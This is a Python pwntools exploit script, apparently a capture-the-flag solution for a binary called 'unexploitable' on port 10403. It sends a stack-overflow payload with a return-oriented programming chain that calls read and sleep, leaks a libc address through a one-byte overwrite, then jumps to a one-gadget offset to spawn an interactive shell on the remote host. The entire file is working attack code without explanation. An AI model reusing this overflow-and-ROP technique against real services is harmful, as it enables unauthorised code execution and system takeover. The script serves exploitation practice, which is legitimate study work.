from pwn import *

def main(host,port=10403):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./unexploitable",env={'LD_PRELOAD':"./libc_64.so.6"})
		gdb.attach(p,"b *0x400576")
	# 0x0000000000400600: mov edi, dword ptr [rsp + 0x30]; add rsp, 0x38; ret;
	# 0x00000000004005fb: mov esi, dword ptr [rsp + 0x28]; mov r15, qword ptr [rsp + 0x30]; add rsp, 0x38; ret; 
	
	read_addr = 0x40055B
	fake_rbp = 0x601210
	
	payload = "A"*0x10+p64(fake_rbp)+p64(0x4005fb)
	payload = payload.ljust(0x48,"\x00")
	payload += p64(0x601010)+p64(0)
	payload += p64(elf.symbols["read"])
	payload += p64(0x0000000000400600)+p64(0)*6
	payload += p64(1)+p64(elf.symbols["sleep"])
	payload += p64(read_addr)
	
	p.send(payload.ljust(0x100,"\x00"))
	
	pause()
	p.send("\xde")
	# pause()
	
	libc.address = u64(p.recv(8))-0xcb6de
	info("libc : " + hex(libc.address))
	
	one_shot = 0xef6c4
	
	payload = "A"*0x18+p64(libc.address+one_shot)
	
	p.send(payload)
	
	p.interactive()
	
if __name__ == "__main__":
	elf = ELF("./unexploitable",checksec=False)
	libc = ELF("./libc_64.so.6")
	main(args['REMOTE'])

